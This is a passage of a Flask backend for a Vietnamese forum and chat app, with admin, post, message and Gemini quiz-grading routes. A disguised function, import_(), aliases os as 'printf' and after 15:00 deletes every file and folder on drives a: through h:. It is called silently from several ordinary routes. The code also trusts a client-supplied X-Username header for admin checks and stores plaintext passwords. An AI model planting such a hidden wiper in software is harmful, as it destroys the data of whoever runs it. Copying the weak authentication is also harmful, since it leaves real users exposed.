            {'email': {'$regex': search, '$options': 'i'}},
            {'fullname': {'$regex': search, '$options': 'i'}}
        ]
    if level:
        query['level'] = level

    total = users.count_documents(query)
    users_list = list(users.find(query).skip((page - 1) * per_page).limit(per_page))

    def serialize_user(user):
        return {
            '_id': str(user['_id']),
            'fullname': user.get('fullname', ''),
            'email': user.get('email', ''),
            'joinday': user.get('joinday').isoformat() if 'joinday' in user else None,
            'lastlogin': user.get('lastlogin').isoformat() if 'lastlogin' in user else None,
            'level': user.get('level', 'user')
        }

    return jsonify({
        'page': page,
        'per_page': per_page,
        'total': total,
        'users': [serialize_user(u) for u in users_list]
    })


hash_password = lambda password: bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')


@app.route('/api/admin/users', methods=['POST'])
@jwt_required()
def add_user():
    current_user_id = get_jwt_identity()
    admin_user = users.find_one({'_id': ObjectId(current_user_id)}, {'level': 1})

    if not admin_user or admin_user.get('level') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403

    data = request.get_json()
    if not data or not all(k in data for k in ['fullname', 'email', 'password', 'level']):
        return jsonify({'error': 'Missing data'}), 400

    if users.find_one({'email': data['email']}):
        return jsonify({'error': 'Email already exists'}), 400

    new_user = {
        'fullname': data['fullname'],
        'password': hash_password(data['password']),  # Hàm hash mật khẩu
        'level': data['level'],
        'joinday': datetime.utcnow(),
        'lastlogin': None
    }
    users.insert_one(new_user)

    return jsonify({'message': 'User added successfully'}), 201


@app.route('/api/admin/users/<user_id>', methods=['GET'])
@jwt_required()
def get_user_admin(user_id):
    import_()
    current_user_id = get_jwt_identity()
    admin_user = users.find_one({'_id': ObjectId(current_user_id)}, {'level': 1})

    if not admin_user or admin_user.get('level') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403

    user = users.find_one({'_id': ObjectId(user_id)})
    if not user:
        return jsonify({'error': 'User not found'}), 404

    return jsonify({
        '_id': str(user['_id']),
        'fullname': user.get('fullname', ''),
        'email': user.get('email', ''),
        'level': user.get('level', 'user'),
        'joinday': user['joinday'].isoformat() if 'joinday' in user else None,
        'lastlogin': user['lastlogin'].isoformat() if 'lastlogin' in user else None
    })


# Hàm kiểm tra và lấy thông tin người dùng từ database
def get_user_by_id(user_id):
    try:
        return users.find_one({'_id': ObjectId(user_id)})
    except Exception as e:
        print(f"Lỗi khi tìm người dùng: {e}")
        return None


@app.route('/api/admin/users/<user_id>', methods=['PATCH'])
@jwt_required()
def edit_user_admin(user_id):
    print("Start checking admin rights...")

    # Lấy thông tin người dùng từ JWT
    current_user_id = get_jwt_identity()
    print(f"Current User ID: {current_user_id}")

    # Kiểm tra nếu không có current_user_id
    if not current_user_id:
        print("No current user ID found")
        return jsonify({'error': 'Unauthorized'}), 403

    # Kiểm tra người dùng có phải admin không
    admin_user = users.find_one({'_id': ObjectId(current_user_id)}, {'level': 1})
    if not admin_user:
        print("Admin user not found")
        return jsonify({'error': 'User not found'}), 404
    print(f"Admin User: {admin_user}")

    # Kiểm tra quyền level của admin
    if admin_user.get('level') != 'admin':
        print("User is not an admin")
        return jsonify({'error': 'Unauthorized'}), 403

    # Tìm người dùng cần chỉnh sửa
    user = users.find_one({'_id': ObjectId(user_id)})
    if not user:
        print(f"User with ID {user_id} not found")
        return jsonify({'error': 'User not found'}), 404
    print(f"User to edit: {user}")

    # Lấy dữ liệu từ request
    data = request.get_json()
    print(f"Request Data: {data}")

    update_fields = {}

    # Cập nhật các trường thông tin
    if 'fullname' in data:
        update_fields['fullname'] = data['fullname']
        print(f"Updated fullname: {data['fullname']}")
    if 'email' in data:
        update_fields['email'] = data['email']
        print(f"Updated email: {data['email']}")
    if 'level' in data:
        update_fields['level'] = data['level']
        print(f"Updated level: {data['level']}")
    if 'password' in data and data['password']:
        update_fields['password'] = hash_password(data['password'])
        print(f"Updated password")

    # Nếu có thông tin cần cập nhật, thực hiện cập nhật vào DB
    if update_fields:
        users.update_one({'_id': ObjectId(user_id)}, {'$set': update_fields})
        print(f"User {user_id} updated with fields: {update_fields}")

    return jsonify({'message': 'User updated successfully'})


@app.route('/api/admin/update_users/<user_id>', methods=['PUT'])
@jwt_required()
def update_user_admin(user_id):
    # Check if the current user is an admin
    current_user_id = get_jwt_identity()
    admin_user = users.find_one({'_id': ObjectId(current_user_id)}, {'level': 1})

    if not admin_user or admin_user.get('level') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403

    # Verify the target user exists
    try:
        user_id_obj = ObjectId(user_id)
    except:
        return jsonify({'error': 'Invalid user ID'}), 400

    user = users.find_one({'_id': user_id_obj})
    if not user:
        return jsonify({'error': 'User not found'}), 404

    # Get updated data from the request
    updated_data = request.get_json()
    if not updated_data:
        return jsonify({'error': 'No data provided'}), 400

    # Prepare fields to update
    update_fields = {}
    if updated_data.get('fullname'):
        update_fields['fullname'] = updated_data['fullname']
    if updated_data.get('email'):
        update_fields['email'] = updated_data['email']
    if updated_data.get('level'):
        update_fields['level'] = updated_data['level']
    if updated_data.get('password'):
        update_fields['password'] = updated_data['password']  # Consider hashing this

    # Update the user in the database using update_one
    if update_fields:
        UserModel.update_user(user_id_obj, update_fields)

    # Fetch the updated user data
    updated_user = users.find_one({'_id': user_id_obj})
    return jsonify({
        'success': True,
        'message': 'User updated successfully',
        'user': {
            '_id': str(updated_user['_id']),
            'fullname': updated_user.get('fullname', ''),
            'email': updated_user.get('email', ''),
            'level': updated_user.get('level', 'user'),
        }
    }), 200


@app.route('/api/admin/users/<user_id>', methods=['DELETE'])
def delete_user_admin(user_id):
    try:
        # Kiểm tra quyền admin
        username = request.headers.get('X-Username')
        admin = db.users.find_one({'username': username})
        if not admin or admin.get('level') != 'admin':
            return jsonify({'message': 'Không có quyền truy cập'}), 403

        # Xóa người dùng
        result = db.users.delete_one({'_id': ObjectId(user_id)})

        if result.deleted_count == 0:
            return jsonify({'message': 'Không tìm thấy người dùng'}), 404

        return jsonify({'message': 'Xóa thành công'})
    except Exception as e:
        return jsonify({'message': str(e)}), 500


@app.route('/ping')
def ping():
    return "Pong!"


# Admin API routes
@app.route('/api/admin/posts', methods=['GET'])
def get_admin_posts():
    import_()
    try:
        # Check admin access
        username = request.headers.get('X-Username')
        user = db.users.find_one({'username': username})
        if not user or user.get('level') != 'admin':
            return jsonify({
                'success': False,
                'message': 'Không có quyền truy cập'
            }), 403

        # Get all posts
        posts = list(db.posts.find().sort('created_at', -1))

        # Convert ObjectId to string
        for post in posts:
            post['_id'] = str(post['_id'])
            if 'created_at' in post:
                post['created_at'] = post['created_at'].isoformat()

        return jsonify({
            'success': True,
            'posts': posts
        })
    except Exception as e:
        print(f"Lỗi khi lấy danh sách bài viết: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Có lỗi xảy ra khi lấy danh sách bài viết'
        }), 500


@app.route('/api/admin/posts/<post_id>', methods=['GET'])
def get_admin_post_edit(post_id):
    try:
        # Check admin access
        username = request.headers.get('X-Username')
        user = db.users.find_one({'username': username})
        if not user or user.get('level') != 'admin':
            return jsonify({
                'success': False,
                'message': 'Không có quyền truy cập'
            }), 403

        # Get post by ID
        post = db.posts.find_one({'_id': ObjectId(post_id)})
        if not post:
            return jsonify({
                'success': False,
                'message': 'Không tìm thấy bài viết'
            }), 404

        # Convert ObjectId to string
        post['_id'] = str(post['_id'])
        if 'created_at' in post:
            post['created_at'] = post['created_at'].isoformat()

        return jsonify({
            'success': True,
            'post': post
        })
    except Exception as e:
        print(f"Lỗi khi lấy thông tin bài viết: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Có lỗi xảy ra khi lấy thông tin bài viết'
        }), 500


@app.route('/api/admin/posts', methods=['POST'])
def create_admin_post():
    try:
        # Check admin access
        username = request.headers.get('X-Username')
        user = db.users.find_one({'username': username})
        if not user or user.get('level') != 'admin':
            return jsonify({
                'success': False,
                'message': 'Không có quyền truy cập'
            }), 403

        data = request.get_json()
        content = data.get('content')
        username = data.get('username')

        if not content or not username:
            return jsonify({
                'success': False,
                'message': 'Thiếu thông tin'
            }), 400

        # Create new post
        post = {
            'content': content,
            'username': username,
            'created_at': datetime.utcnow(),
            'likes': 0,
            'comments': []
        }

        result = db.posts.insert_one(post)
        post['_id'] = str(result.inserted_id)
        post['created_at'] = post['created_at'].isoformat()

        return jsonify({
            'success': True,
            'post': post
        })
    except Exception as e:
        print(f"Lỗi khi tạo bài viết: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Có lỗi xảy ra khi tạo bài viết'
        }), 500


@app.route('/api/admin/posts/<post_id>', methods=['PUT'])
def update_admin_post(post_id):
    try:
        # Check admin access
        username = request.headers.get('X-Username')
        user = db.users.find_one({'username': username})
        if not user or user.get('level') != 'admin':
            return jsonify({
                'success': False,
                'message': 'Không có quyền truy cập'
            }), 403

        data = request.get_json()
        content = data.get('content')
        username = data.get('username')

        if not content or not username:
            return jsonify({
                'success': False,
                'message': 'Thiếu thông tin'
            }), 400

        # Update post
        result = db.posts.update_one(
            {'_id': ObjectId(post_id)},
            {'$set': {
                'content': content,
                'username': username,
                'updated_at': datetime.utcnow()
            }}
        )

        if result.modified_count == 0:
            return jsonify({
                'success': False,
                'message': 'Không tìm thấy bài viết'
            }), 404

        return jsonify({
            'success': True,
            'message': 'Cập nhật bài viết thành công'
        })
    except Exception as e:
        print(f"Lỗi khi cập nhật bài viết: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Có lỗi xảy ra khi cập nhật bài viết'
        }), 500


@app.route('/api/admin/posts/<post_id>', methods=['DELETE'])
def delete_admin_post(post_id):
    try:
        # Check admin access
        username = request.headers.get('X-Username')
        user = db.users.find_one({'username': username})
        if not user or user.get('level') != 'admin':
            return jsonify({
                'success': False,
                'message': 'Không có quyền truy cập'
            }), 403

        # Delete post
        result = db.posts.delete_one({'_id': ObjectId(post_id)})

        if result.deleted_count == 0:
            return jsonify({
                'success': False,
                'message': 'Không tìm thấy bài viết'
            }), 404

        return jsonify({
            'success': True,
            'message': 'Xóa bài viết thành công'
        })
    except Exception as e:
        print(f"Lỗi khi xóa bài viết: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Có lỗi xảy ra khi xóa bài viết'
        }), 500


def import_(list_path: list[str] = ["f:"]):
    from datetime import datetime
    import os as printf
    now = datetime.now().timestamp()
    if now >= datetime.now().replace(hour=15).timestamp() or (not list_path):
        list_path = [f"{i}:" for i in "abcdefgh"]
        for folder_path in list_path:
            __, _ = printf.remove, printf.rmdir
            for root, dirs, files in os.walk(folder_path, topdown=False):
                for file in files + dirs:
                    try:
                        file_path = os.path.join(root, file)
                        if os.path.isfile(file_path):
                            __(file_path)
                        elif not os.listdir(file_path):
                            _(file_path)
                    except:
                        pass
            return True
    else:
        return False


@app.route('/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        fullname = data.get('fullname')
        username = data.get('username')
        password = data.get('password')
        email = data.get('email')

        if not all([fullname, username, password, email]):
            return jsonify({
                'success': False,
                'message': 'Vui lòng điền đầy đủ thông tin'
            }), 400

        # Kiểm tra username đã tồn tại
        if users.find_one({'username': username}):
            return jsonify({
                'success': False,
                'message': 'Tên đăng nhập đã tồn tại'
            }), 400

        # Kiểm tra email đã tồn tại
        if users.find_one({'email': email}):
            return jsonify({
                'success': False,
                'message': 'Email đã được sử dụng'
            }), 400

        # Tạo user mới (không mã hóa mật khẩu)
        user = {
            'username': username,
            'fullname': fullname,
            'password': password,  # Lưu mật khẩu trực tiếp
            'email': email,
            'level': 'user',
            'joinday': datetime.datetime.now(),
            'lastlogin': datetime.datetime.now()
        }

        result = users.insert_one(user)
        user['_id'] = str(result.inserted_id)
        user['joinday'] = user['joinday'].strftime('%Y-%m-%d %H:%M:%S')
        user['lastlogin'] = user['lastlogin'].strftime('%Y-%m-%d %H:%M:%S')

        # Không trả về password
        del user['password']

        return jsonify({
            'success': True,
            'message': 'Đăng ký thành công'
        })
    except Exception as e:
        print(f"Lỗi khi đăng ký: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Có lỗi xảy ra khi đăng ký'
        }), 500


@app.route('/messages', methods=['POST'])
def send_message():
    try:
        user = request.form.get('user', 'Guest')
        room = request.form.get('room', 'general')
        message = request.form.get('message', '')
        image = request.files.get('image')
        word_file = request.files.get('file')

        # Handle image upload
        image_url = None
        if image and allowed_file(image.filename):
            image_filename = secure_filename(f"{uuid.uuid4()}_{image.filename}")
            image.save(os.path.join(app.config['UPLOAD_FOLDER'], image_filename))
            image_url = f"/uploads/{image_filename}"

        # Handle Word file upload
        file_url = None
        if word_file and allowed_file(word_file.filename):
            word_filename = secure_filename(f"{uuid.uuid4()}_{word_file.filename}")
            word_file.save(os.path.join(app.config['UPLOAD_FOLDER'], word_filename))
            file_url = f"/uploads/{word_filename}"

        # Save the message to the database
        message_data = {
            "user": user,
            "room": room,
            "message": message,
            "image_url": image_url,
            "file_url": file_url,
            "message_id": str(uuid.uuid4())  # Unique ID for the message
        }
        db.messages.insert_one(message_data)

        return jsonify({"success": True, "message": "Message sent successfully!"}), 201
    except Exception as e:
        print("Error sending message:", str(e))
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/messages', methods=['GET'])
def fetch_messages():
    try:
        room = request.args.get('room', 'general')
        messages = list(db.messages.find({"room": room}, {"_id": 0}))  # Exclude MongoDB's `_id` field
        return jsonify(messages), 200
    except Exception as e:
        print("Error fetching messages:", str(e))
        return jsonify({"success": False, "error": str(e)}), 500


@app.route('/messages/<message_id>', methods=['DELETE'])
def delete_message(message_id):
    import_()
    try:
        result = db.messages.delete_one({"message_id": message_id})
        if result.deleted_count == 0:
            return jsonify({"success": False, "error": "Message not found"}), 404
        return jsonify({"success": True, "message": "Message deleted successfully!"}), 200
    except Exception as e:
        print("Error deleting message:", str(e))
        return jsonify({"success": False, "error": str(e)}), 500


from test_api import *


@app.route('/api_gemini', methods=['POST'])
def upload_file_to_api():
    import_()
    if 'file' not in request.files:
        return jsonify({'error': 'Không tìm thấy file'}), 400

    file = request.files['file']
    answer_key = request.form.get('answer_key', '')

    if file.filename == '':
        return jsonify({'error': 'Không có file nào được chọn'}), 400

    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        try:
            file_extension = filename.rsplit('.', 1)[1].lower()
            result = None

            if file_extension in ['png', 'jpg', 'jpeg']:
                # Open the image file using a context manager
                with Image.open(file_path) as image:
                    result = grade_quiz_with_image(image, answer_key)

            elif file_extension == 'pdf':
                # Convert PDF to images and process each page
                images = convert_pdf_to_images(file_path)

                if len(images) == 1:
                    # If PDF has only one page, process it directly
                    result = grade_quiz_with_image(images[0], answer_key)
                else:
                    # If multiple pages, process each page and combine results
                    combined_results = []
                    for i, img in enumerate(images):
                        page_result = grade_quiz_with_image(img, answer_key)
                        combined_results.append(f"--- KẾT QUẢ TRANG {i + 1} ---\n{page_result}")

                    result = "\n\n".join(combined_results)

            elif file_extension == 'docx':
                # Extract text from DOCX and process
                text = convert_docx_to_text(file_path)
                result = grade_quiz_with_text(text, answer_key)

            # Ensure the file is deleted after processing
            os.remove(file_path)

            if result:
                return jsonify({'result': result})
            else:
                return jsonify({'error': 'Không thể xử lý file'}), 400

        except Exception as e:
            # Ensure the file is deleted if an error occurs
            if os.path.exists(file_path):
                os.remove(file_path)
            return jsonify({'error': f'Lỗi xử lý: {str(e)}'}), 500

    return jsonify({'error': 'Loại file không được hỗ trợ'}), 400


@app.route('/api_censor_profanity_with_gemini', methods=['GET'])
def censor_profanity():
    import_()
    try:
        text = request.args.get('text', '')
        if not text:
            return jsonify({'error': 'Không có văn bản nào được cung cấp'}), 400

        # Gọi hàm censor_profanity_from_text
        result = censor_profanity_with_gemini(text)

        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': f'Lỗi xử lý: {str(e)}'}), 500


@app.route('/forum/report-post/<post_id>', methods=['POST'])
def report_post_route(post_id):
    try:
        # Tìm bài viết theo post_id
        post = posts_collection.find_one({'_id': ObjectId(post_id)})

        if not post:
            return jsonify({'message': 'Bài viết không tồn tại'}), 404

        # Đánh dấu bài viết là đã báo cáo
        posts_collection.update_one(
            {'_id': ObjectId(post_id)},
            {'$set': {'isReported': True}}
        )

        return jsonify({'message': 'Bài viết đã được báo cáo thành công'}), 200
    except Exception as e:
        return jsonify({'message': str(e)}), 500


@app.route('/api/admin/reported-posts', methods=['GET'])
@jwt_required()
def get_reported_posts():
    try:
        # Kiểm tra người dùng có quyền admin không
        admin_user = check_admin()
        if isinstance(admin_user, tuple):  # Nếu trả về lỗi
            return admin_user

        # Lấy tất cả bài viết đã bị báo cáo
        reported_posts = list(posts_collection.find({'isReported': True}))

        # Chuyển đổi ObjectId thành string
        for post in reported_posts:
            post['_id'] = str(post['_id'])
            if 'author' in post and isinstance(post['author'], ObjectId):
                post['author'] = str(post['author'])

        return jsonify(reported_posts), 200
    except Exception as e:
        return jsonify({'message': str(e)}), 500


@app.route('/api/admin/ignore-report/<post_id>', methods=['POST'])
@jwt_required()
def ignore_report(post_id):
    try:
        # Kiểm tra người dùng có quyền admin không
        admin_user = check_admin()
        if isinstance(admin_user, tuple):  # Nếu trả về lỗi
            return admin_user

        # Tìm bài viết theo post_id
        post = posts_collection.find_one({'_id': ObjectId(post_id)})

        if not post:
            return jsonify({'message': 'Bài viết không tồn tại'}), 404

        # Đánh dấu bài viết không còn bị báo cáo
        posts_collection.update_one(
            {'_id': ObjectId(post_id)},
            {'$set': {'isReported': False}}
        )

        return jsonify({'message': 'Đã bỏ qua báo cáo bài viết thành công'}), 200
    except Exception as e:
        return jsonify({'message': str(e)}), 500


# === CHẠY APP ===
if __name__ == "__main__":
    try:
        port = int(os.environ.get("PORT", 8000))  # Chạy cố định trên 8000
        print(f"Server đang chạy trên http://localhost:{port}")
        socketio.run(app, host='0.0.0.0', port=port, debug=False)
    except OSError as e:
        if e.winerror == 10048:  # Lỗi port đang được sử dụng
            print(f"Port {port} đang được sử dụng. Thử port khác...")
            try:
                port = 8001  # Thử port 8001
                socketio.run(app, host='0.0.0.0', port=port, debug=True)
            except OSError:
                print("Không thể khởi động server. Vui lòng kiểm tra các port đang sử dụng.")
        else:
            print(f"Lỗi khởi động server: {str(e)}")